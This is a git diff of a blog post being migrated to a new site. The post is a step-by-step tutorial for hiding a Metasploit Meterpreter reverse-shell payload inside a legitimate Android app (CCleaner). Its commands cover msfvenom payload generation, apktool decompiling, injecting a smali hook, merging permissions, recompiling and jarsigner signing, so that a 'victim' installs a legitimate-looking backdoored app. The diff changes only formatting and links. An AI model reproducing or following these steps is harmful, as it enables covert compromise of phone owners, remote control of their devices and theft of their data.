@@ -1,19 +1,21 @@
 ---
+layout: post
 comments: true
-date: 2015-12-19 15:15:25+00:00
+date: 'Sat Dec 19 2015 20:45:25 GMT+0530 (India Standard Time)'
 slug: embed-metasploit-payload-in-apk-manually
 title: Embed a Metasploit Payload in an original .apk File | Part 2 - Do it manually
 wordpress_id: 194
 categories:
-- Android
-- Hacking
-- Metasploit
+  - Android
+  - Hacking
+  - Metasploit
 tags:
-- Android
-- Hacking
-- Kali
-- Metasploit
-- Meterpreter
+  - Android
+  - Hacking
+  - Kali
+  - Metasploit
+  - Meterpreter
+published: true
 ---
 
 Metasploit's flagship product, the Meterpreter, is very powerful and an all-purpose payload. Once installed on the victim machine, we can do whatever we want to their system by sending out commands to it. For example, we could grab sensitive data out of the compromised system.
@@ -22,7 +24,7 @@ The Meterpreter payload also comes as an installable .apk file for Android syste
 
 One of the solutions is that you can embed the payload inside another legitimate app. The app will look and behave exactly as the original one, so the victim won't even know that his system is compromised. That's what we are going to do in this tutorial.
 
-__Note__ - This is a follow-up post of [my previous post](https://techkernel.wordpress.com/2015/12/11/embed-a-metasploit-payload-in-an-original-apk-file/), in which I showed you how to do this using a very simple yet effective Ruby script. If you haven't read it, [check it out](https://techkernel.wordpress.com/2015/12/11/embed-a-metasploit-payload-in-an-original-apk-file/). If you are not willing to go down the hard path, you can use that method to do it just fine. But if you want to know the inner workings and have a greater knowledge, continue reading this post. And also, In the following Android Hacking tutorials, I may refer to this tutorial, so If you can take it, I suggest you to keep on reading.
+__Note__ - This is a follow-up post of [my previous post](/articles/embed-a-metasploit-payload-in-an-original-apk-file/), in which I showed you how to do this using a very simple yet effective Ruby script. If you haven't read it, [check it out](/articles/embed-a-metasploit-payload-in-an-original-apk-file/). If you are not willing to go down the hard path, you can use that method to do it just fine. But if you want to know the inner workings and have a greater knowledge, continue reading this post. And also, In the following Android Hacking tutorials, I may refer to this tutorial, so If you can take it, I suggest you to keep on reading.
 
 
 ### Pre-Requisites
@@ -32,7 +34,7 @@ This tutorial is based on the Kali Linux Operating System. I'm sure it can be do
 We will also need some libraries and tools in the following steps, so I think it's better if you install them right now.
 
 To install the required libraries, enter this command at the console:
-```
+```console
 apt-get install lib32stdc++6 lib32ncurses5 lib32z1
 ```
 
@@ -60,7 +62,7 @@ That's about it. I will also show you how can you get a working Meterpreter sess
 ### Step 1: Generate the Payload
 
 First of all, we have to make the Meterpreter payload. We are going to use MSFVenom for this. The command is-
-```
+```console
 msfvenom -p android/meterpreter/[Payload_Type] LHOST=[IP_Address] LPORT=[Incoming_Port] -o meterpreter.apk
 ```
 
@@ -73,10 +75,10 @@ Replace [Payload_Type] by any of the following payloads available. The function 
 You can use any one you like, I'm going to use reverse_https as an example.
 
 Replace [IP_Address] by the IP address to which the payload is going to connect back to, i.e the IP address of the attacker's system. If you are going to perform this attack over a local network (eg. if the victim and attacker are connected to the same WiFi hotspot), your Local IP will suffice. To know what your local IP is, run the command -
-```
+```console
 ifconfig
 ```
-![Screenshot from 2015-12-18 13:56:49](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-18-135649.png)
+![Screenshot from 2015-12-18 13:56:49](/img/posts/screenshot-from-2015-12-18-135649.png)
 
 
 If you are going to perform this attack over the Internet, you have to use your public IP address, and configure your router properly (set up port forwarding) so that your system is accessible from the Internet. To know your public IP, just google "My IP" and Google will help you out.
@@ -86,19 +88,19 @@ Replace [Incoming_Port] with the port no. which you want to be used by the paylo
 
 So run the command using replacing the keywords with appropriate values and MSFVenom will generate a payload "meterpreter.apk" in the root directory. Note that we specified the output file name using the "-o meterpreter.apk" argument in the command, so if you like, you can name it anything else also.
 
-![Screenshot from 2015-12-18 14:23:14](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-18-142314.png)
+![Screenshot from 2015-12-18 14:23:14](/img/posts/screenshot-from-2015-12-18-142314.png)
 
 
 ### Step 2: Decomplile the APKs
 
 Now we have to decompile the APKs, for this we are going to use APKTool. It decompiles the code to a fairly human-readable format and saves it in .smali files, and also successfully extracts the .xml files. Assuming you have already installed the latest apktool and also have the original apk file in the root directory, run the following commands -
-```
+```console
 apktool d -f -o payload /root/meterpreter.apk
 apktool d -f -o original /root/[Original_APK_Name] 
 ```   
 It will decompile the payload to "/root/payload" and the original apk to "/root/original" directory.
 
-![Screenshot from 2015-12-19 01:30:26](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-013026.png)
+![Screenshot from 2015-12-19 01:30:26](/img/posts/screenshot-from-2015-12-19-013026.png)
 
 
 ### Step 3: Copy the Payload Files
@@ -121,18 +123,18 @@ So open up the AndroidManifest.xml file located inside the "/root/original" fold
 
 On a side note, you can use CTRL+F to search within the document in any GUI text editor. When you locate that activity, note its "android:name" attribute's value. In my case, as you can see from the screenshot below, it is "com.piriform.ccleaner.ui.activity.MainActivity".
 
-![Screenshot from 2015-12-19 13:21:32](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-132132.png)
+![Screenshot from 2015-12-19 13:21:32](/img/posts/screenshot-from-2015-12-19-132132.png)
 
 Those two lines we searched for signifies that this is the activity which is going to start when we launch the app from the launcher icon, and also this is a MAIN activity (similar to the 'main' function in traditional programming).
 
 Now that we have the name of the activity we want to inject the hook into, let's get to it! First of all, open the .smali code of that activity using gedit. Just open a terminal and type -
-```
+```console
 gedit /root/original/smali/[Activity_Path]
 ```
 
 Replace the [Activity_Path] with the activity's "android:name", but instead of the dots, type slash. Actually the smali codes are stored in folders named in the format the "android:name" is in, so we can easily get the location of the .smali code in the way we did. Check the screenshot below and you will get an idea of what I'm trying to say.
 
-![Screenshot from 2015-12-19 19:06:17](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-190617.png)
+![Screenshot from 2015-12-19 19:06:17](/img/posts/screenshot-from-2015-12-19-190617.png)
 
 Now search for the following line in the smali code (using CTRL+F) -
 ```
@@ -159,21 +161,21 @@ If we do not mention all the additional permissions that our payload is going to
 These permissions are also listed in the previously encountered AndroidManifest file. So let's open the AndroidManifest.xml of both the original app and the payload from the respective folders. The permissions are mentioned inside <uses-permission> tag as an attribute 'android:name'. Copy the additional permission lines from the Payload's AndroidManifest to the original app's one. But be careful that there should not be any duplicate.
 
 Here's my original app's AndroidManifest before editing -
-![Screenshot from 2015-12-19 19:37:12](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-193712.png)
+![Screenshot from 2015-12-19 19:37:12](/img/posts/screenshot-from-2015-12-19-193712.png)
 
 After adding the additional ones from the Payload's AndroidManifest, my /root/original/AndroidManifest.xml looks like this - 
-![Screenshot from 2015-12-19 19:42:48](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-194248.png)
+![Screenshot from 2015-12-19 19:42:48](/img/posts/screenshot-from-2015-12-19-194248.png)
 
 
 ### Step 6: Recompile The Original APK
 
 
 Now the hard parts are all done! We just have to recompile the backdoored app into an installable apk. Run the following command -
-```
+```console
 apktool b /root/original
 ```
 
-![Screenshot from 2015-12-19 20:14:31](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-201431.png)
+![Screenshot from 2015-12-19 20:14:31](/img/posts/screenshot-from-2015-12-19-201431.png)
 
 You will now have the compiled apk inside the "/root/original/dist" directory. But, we're still not done yet.
 
@@ -187,17 +189,17 @@ This is also a very important step, as in most of the cases, an unsigned apk can
 
 In this case we are going to sign the apk using the default android debug key. Just run the following command -
 
-```    
+```console
 jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA [apk_path] androiddebugkey
 ```
 
 Be sure to replace the [apk_path] in the above command with the path to your backdoored apk file.
 
-![Screenshot from 2015-12-19 20:28:31](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-202831.png)
+![Screenshot from 2015-12-19 20:28:31](/img/posts/screenshot-from-2015-12-19-202831.png)
 
 
 ### PROFIT?!
 
 Now if you can get the victim to install and run this very legit-looking app in his phone, you can get a working meterpreter session on his phone!
 
-![Screenshot from 2015-12-19 20:44:01](https://techkernel.files.wordpress.com/2015/12/screenshot-from-2015-12-19-204401.png)
+![Screenshot from 2015-12-19 20:44:01](/img/posts/screenshot-from-2015-12-19-204401.png)
